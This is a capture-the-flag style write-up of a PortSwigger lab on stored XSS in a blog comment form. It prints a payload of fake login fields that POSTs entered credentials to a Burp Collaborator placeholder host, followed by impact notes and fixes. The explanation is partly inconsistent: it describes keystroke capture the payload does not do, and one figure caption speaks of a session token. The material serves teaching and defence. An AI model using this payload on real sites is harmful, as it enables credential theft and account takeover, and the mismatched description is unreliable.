## Lab Title: Exploiting cross-site scripting to capture passwords  

- **Category:** Cross-Site Scripting  
- **Level:** Practitioner  
- **Platform:** PortSwigger Web Security Academy  

## Overview  
This lab demonstrates how a stored XSS vulnerability can be leveraged to capture sensitive information such as user passwords. The vulnerable functionality is the blog comments feature, which reflects unsanitized input directly into the page. When a victim views the comments, any injected JavaScript executes in their browser.  

## Vulnerability Context  
- **Entry Point:** Blog comment submission form.  
- **Reflection Point:** Rendered comment content on the blog page.  
- **Impact:** Arbitrary JavaScript execution in the victim’s browser.  
- **Security Weakness:** Lack of input sanitization and unsafe rendering of user‑supplied data.  

## Exploit Technique  
The attack relies on injecting a `<script>` block that captures keystrokes from password fields and sends them to an attacker‑controlled endpoint. In this lab, Burp Collaborator is used as the exfiltration server.  

### Example Payload  
```html

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

```
**Figure 1: Injecting a stored XSS payload into the comment form to serve fake login fields and exfiltrate credentials to Burp Collaborator.**

<img width="946" height="611" alt="image" src="https://github.com/user-attachments/assets/1cd2f910-1766-4e4f-9b7c-005edd555bee" />

- When the victim types into a password field, each keystroke is captured.
- A POST request is sent to the attacker’s Collaborator subdomain containing the keystroke data.
- The attacker can reconstruct the victim’s password from the captured keystrokes.

## Verification

- The Collaborator server records HTTP interactions containing the victim’s keystrokes.
- Replaying the captured data reveals the victim’s password.
- Using the stolen credentials allows impersonation of the victim account.

**Figure 2: Intercepting the administrative user's session token via Burp Collaborator.**

<img width="1311" height="564" alt="image" src="https://github.com/user-attachments/assets/10336052-ce5e-483b-8c6d-e0e5f70b26eb" />

---

<img width="678" height="559" alt="image" src="https://github.com/user-attachments/assets/96648350-02b6-4c76-8e43-2a3baa38ec8f" />

---

<img width="1356" height="616" alt="image" src="https://github.com/user-attachments/assets/744d7b93-046c-471a-ae8d-40a6cc4b4b19" />


## Security Impact

- Credential Theft: Attackers can capture passwords directly from user input.
- Account Takeover: Stolen credentials enable full impersonation of victim accounts.
- Persistence: Stored XSS ensures every future visitor to the page is affected.

## Recommended Fixes

- Encode and sanitize all user input before rendering.
- Avoid inline event handlers and direct DOM insertion of user‑supplied content.
- Apply Content Security Policy (CSP) to restrict script execution.
- Use secure authentication mechanisms that minimize exposure of sensitive input.

## Lessons Learned
This lab highlights how stored XSS can escalate from nuisance alerts to serious credential theft. By capturing keystrokes, attackers gain direct access to user passwords. Preventing such attacks requires both secure coding practices and defense‑in‑depth measures like CSP and secure cookie attributes.

